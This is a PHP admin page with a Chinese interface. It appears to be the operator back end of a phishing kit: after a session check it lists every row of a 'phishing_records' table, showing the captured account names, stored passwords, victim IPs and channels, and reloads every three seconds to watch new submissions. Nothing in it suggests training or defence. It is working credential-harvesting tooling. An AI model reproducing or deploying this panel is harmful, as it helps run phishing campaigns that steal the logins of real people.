<?php
session_start();
if (empty($_SESSION['admin'])) {
    header('Location: login.php');
    exit;
}
require __DIR__ . '/../config.php';

$rows = db()->query('SELECT * FROM phishing_records ORDER BY id DESC')->fetchAll();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <title>后台管理</title>
    <link rel="stylesheet" href="../style.css">
    <meta http-equiv="refresh" content="3">
</head>
<body>
<div class="container" style="max-width:960px">
    <h2>提交记录</h2>
    <p class="notice">本页展示用户提交记录，每 3 秒自动刷新。</p>
    <?php if (count($rows) === 0): ?>
        <p>暂无记录。</p>
    <?php else: ?>
    <table>
        <tr>
            <th>时间</th>
            <th>账号</th>
            <th>密码状态</th>
            <th>IP</th>
            <th>渠道</th>
        </tr>
        <?php foreach ($rows as $r): ?>
        <tr>
            <td><?= htmlspecialchars($r['created_at'], ENT_QUOTES, 'UTF-8') ?></td>
            <td><?= htmlspecialchars($r['account'], ENT_QUOTES, 'UTF-8') ?></td>
            <td><?= htmlspecialchars($r['password'], ENT_QUOTES, 'UTF-8') ?></td>
            <td><?= htmlspecialchars($r['ip'], ENT_QUOTES, 'UTF-8') ?></td>
            <td><?= htmlspecialchars($r['channel'], ENT_QUOTES, 'UTF-8') ?></td>
        </tr>
        <?php endforeach; ?>
    </table>
    <?php endif; ?>
    <p class="nav-links">
        <a href="logout.php">退出登录</a>
        <a href="../index.php">返回前台</a>
    </p>
</div>
</body>
</html>
